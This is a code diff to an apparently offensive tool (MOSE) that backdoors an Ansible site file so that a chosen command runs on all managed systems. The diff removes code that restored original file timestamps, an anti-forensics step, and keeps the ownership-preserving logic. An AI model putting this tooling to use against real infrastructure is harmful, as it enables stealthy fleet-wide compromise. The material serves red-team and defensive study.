@@ -13,7 +13,6 @@ import (
 	"regexp"
 	"strings"
 	"text/template"
-	"time"
 
 	"github.com/CrimsonK1ng/mose/pkg/moseutils"
 	"github.com/ghodss/yaml"
@@ -37,9 +36,6 @@ type ansibleFiles struct {
 	vaultFile    string
 	uid          int
 	gid          int
-	ctime        time.Time
-	atime        time.Time
-	mtime        time.Time
 }
 
 type ansible []struct {
@@ -66,9 +62,6 @@ var (
 		vaultFile:    "",
 		uid:          -1,
 		gid:          -1,
-		ctime:        time.Time{},
-		atime:        time.Time{},
-		mtime:        time.Time{},
 	}
 	osTarget       = a.OsTarget
 	ansibleRole    = a.PayloadName
@@ -282,12 +275,6 @@ func backupSiteFile() {
 				moseutils.ErrMsg("issues changing owner of backup file")
 			}
 		}
-		if !files.atime.IsZero() && !files.mtime.IsZero() {
-			err := os.Chtimes(path+".bak.mose", files.atime, files.mtime)
-			if err != nil {
-				moseutils.ErrMsg("issues changing times of backup file")
-			}
-		}
 	} else {
 		moseutils.ErrMsg("Backup of the (%v.bak.mose) already exists.", path)
 	}
@@ -360,15 +347,6 @@ func generatePlaybooks() {
 			err := moseutils.ChownR(filepath.Join(playbookDir, ansibleCommand.CmdName), files.uid, files.gid)
 			if err != nil {
 				moseutils.ErrMsg("issues changing owner of backup file")
-			}
-		}
-		if debug {
-			log.Printf("Attempting to change time metadata of directory")
-		}
-		if !files.atime.IsZero() && !files.mtime.IsZero() {
-			err := os.Chtimes(filepath.Join(playbookDir, ansibleCommand.CmdName), files.atime, files.mtime)
-			if err != nil {
-				moseutils.ErrMsg("issues changing times of backup file")
 			}
 		}
 	}
@@ -590,14 +568,7 @@ func main() {
 	files.uid = uid
 	files.gid = gid
 
-	atime, _, mtime, err := moseutils.GetFileAMCTime(files.siteFile)
-	if err != nil {
-		moseutils.ErrMsg("Error retrieving creation times of file, will default to present time")
-	}
-
-	files.mtime = mtime
-	files.atime = atime
-
+	// TODO: Fix this
 	if cleanup {
 		doCleanup(files.siteFile)
 	}
@@ -640,22 +611,11 @@ func main() {
 	moseutils.Msg("Backdooring %s to run %s on all managed systems, please wait...", files.siteFile, a.Cmd)
 	backdoorSiteFile()
 
-	if debug {
-		fmt.Printf("Gonna change the owner %v", files.uid)
-	}
+	fmt.Printf("Gonna change the owner %v", files.uid)
 	if files.uid != -1 && files.gid != -1 {
 		err := os.Chown(files.siteFile, files.uid, files.gid)
 		if err != nil {
 			moseutils.ErrMsg("issues changing owner of backup file")
-		}
-	}
-	if debug {
-		fmt.Printf("Gonna change the time %v", files.mtime)
-	}
-	if !files.atime.IsZero() && !files.mtime.IsZero() {
-		err := os.Chtimes(files.siteFile, files.atime, files.mtime)
-		if err != nil {
-			moseutils.ErrMsg("issues changing times of backup file")
 		}
 	}
 
